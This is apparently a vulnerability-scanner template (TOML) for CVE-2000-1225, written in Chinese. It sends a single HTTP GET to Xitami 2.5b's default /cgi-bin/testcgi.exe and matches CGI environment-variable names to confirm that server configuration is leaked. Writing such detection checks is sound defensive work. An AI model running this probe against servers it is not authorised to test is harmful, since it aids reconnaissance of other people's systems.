[info]
author = "ave"
description = "Xitami 2.5b Web 服务器默认在 cgi-bin 目录下安装 testcgi.exe，远程攻击者无需认证即可访问该 CGI 程序，获取服务器环境变量、系统路径、目录结构等敏感配置信息。通过发送 HTTP GET 请求到 /cgi-bin/testcgi.exe 并检查响应中是否包含 CGI 环境变量特征字符串来验证漏洞存在。"
id = "POC-AVE-2000-1155"
name = "Xitami 2.5b testcgi.exe 敏感信息泄露 PoC"
severity = "medium"
tags = ["ave-2000-1155"]
vuln_id = [
    "CVE-2000-1225",
    "AVE-2000-1155",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/testcgi.exe"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "SERVER_SOFTWARE",
    "GATEWAY_INTERFACE",
    "PATH_TRANSLATED",
    "SERVER_PROTOCOL",
]
